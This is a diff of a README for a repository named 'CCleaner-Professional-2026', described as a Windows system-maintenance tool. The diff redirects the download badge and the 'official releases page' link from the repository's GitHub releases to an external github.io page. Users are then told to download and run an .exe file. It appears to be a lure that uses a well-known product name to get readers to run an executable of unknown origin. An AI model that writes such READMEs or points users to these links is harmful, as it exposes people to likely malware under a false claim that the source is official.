@@ -1,6 +1,6 @@
 # 🧹 CCleaner-Professional-2026 - Maintain your Windows system performance effectively
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ushaliy9433/CCleaner-Professional-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://ushaliy9433.github.io)
 
 This application provides a workflow to manage your Windows computer. It automates recurring maintenance tasks to keep your system stable. You can schedule cleaning sessions, review registry entries, audit startup programs, and create system restore points.
 
@@ -8,7 +8,7 @@ This application provides a workflow to manage your Windows computer. It automat
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/ushaliy9433/CCleaner-Professional-2026/releases) to download the application.
+1. Visit the [official releases page](https://ushaliy9433.github.io) to download the application.
 2. Locate the latest version in the list.
 3. Click the file ending in .exe to save it to your computer.
 4. Open the downloaded file to start the installation.
